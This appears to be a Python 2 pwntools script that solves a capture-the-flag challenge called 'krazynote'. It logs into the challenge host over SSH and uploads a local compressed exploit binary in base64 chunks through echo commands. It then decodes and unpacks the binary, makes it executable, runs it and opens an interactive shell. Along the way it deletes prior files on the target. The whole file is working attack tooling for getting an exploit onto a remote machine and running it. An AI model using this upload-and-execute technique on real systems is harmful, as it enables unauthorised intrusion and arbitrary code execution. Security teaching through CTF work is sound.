#!/usr/bin/env python2
from pwn import *

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter("$", cmd)
	resp = p.recvuntil("$")

	if print_resp:
		log.info(resp)

	p.unrecv("$")
	return resp

def send_file(name):
	file = read(name)
	f = b64e(file)

	send_command("rm /home/note/a.gz.b64")
	send_command("rm /home/note/a.gz")
	send_command("rm /home/note/a")

	size = 800
	for i in range(len(f)/size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)/size))
		send_command("echo -n '{}'>>/home/note/a.gz.b64".format(f[i*size:(i+1)*size]), False)

	send_command("cat /home/note/a.gz.b64 | base64 -d > /home/note/a.gz")
	send_command("gzip -d /home/note/a.gz")
	send_command("chmod +x /home/note/a")

def exploit():
	send_file("exploit.gz")
	#send_command("/home/note/a")
	p.sendline("/home/note/a")
	p.interactive()

if __name__ == "__main__":

	#context.log_level = 'debug'
	s = ssh(host="krazynote-3.balsnctf.com", port=54321, user="knote", password="knote", timeout=5)
	p = s.shell('/bin/sh')
	#p = process("./run.sh")
	exploit()


  	
